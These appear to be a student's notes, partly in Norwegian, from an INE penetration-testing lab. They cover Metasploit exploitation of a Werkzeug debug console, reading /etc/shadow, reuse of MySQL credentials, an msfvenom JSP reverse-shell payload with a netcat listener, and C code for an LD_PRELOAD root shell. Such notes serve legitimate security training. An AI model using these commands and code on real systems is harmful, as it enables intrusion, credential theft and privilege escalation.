# Blacbox 3 try 2

## find all the service
HOST: 192.224.128.2/24
RHOST1: server1.ine.local -> 192.224.128.3 
    -> werkzeug -p 80 -v httpd -os python
RHOST2: server2.ine.local -> 192.224.128.4 
    -> mysql -p 3306 -v MySQL -os ubuntu
RHOST3: server3.ine.local -> 192.224.128.5 
    -> ssh -p 22 -v OpenSSH -os Ubuntu
    -> http -p 8080 Apache -os Tomcat

## Setup msfconsole 
- $searchsploit werkzeug
- $msfconsole -q
- $use exploit/multi/http/werkzeug_debug_rce
- $show options
- $set options RHOSTS, LHOST
- $check
- $exploit

## Enumerate inside meterpreter
- $cat /etc/shadow
- Check enum for cmd history
- use enum_users_history
- cat the file
- find user information
- Use the mysql credentials to log into mysql
- usemysql UDP exploit to exploit the mysql
- Cat /root/flag.txt when mysql is exploited
- Summary: got root on two remote machine and got a flag.txt

## Last machine


Viktige tips:
Lage en revershell:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war > shell.war

Lyte med netcat:
nc -lvp 443

Importere en python TTY shell:
python -c 'import pty;pty.spawn("/bin/bash");'

Sette opp en preload:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

Kjøre en preload:
sudo LD_PRELOAD=/home/robert/shell.so ls

compile c file:
gcc -fPIC -shared -o shell.so shell.c -nostartfiles